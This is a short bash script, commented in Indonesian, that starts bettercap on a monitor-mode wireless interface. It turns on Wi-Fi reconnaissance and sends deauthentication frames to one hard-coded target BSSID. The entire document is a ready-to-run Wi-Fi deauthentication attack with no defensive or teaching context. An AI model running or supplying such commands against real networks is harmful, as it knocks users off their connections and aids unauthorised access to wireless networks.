#!/bin/bash
# Jalankan bettercap secara non-interaktif: scan lalu deauth ke BSSID target
sudo bettercap -iface wlan0mon -eval "wifi.recon on; wifi.deauth 14:8C:4A:B4:F4:8C"
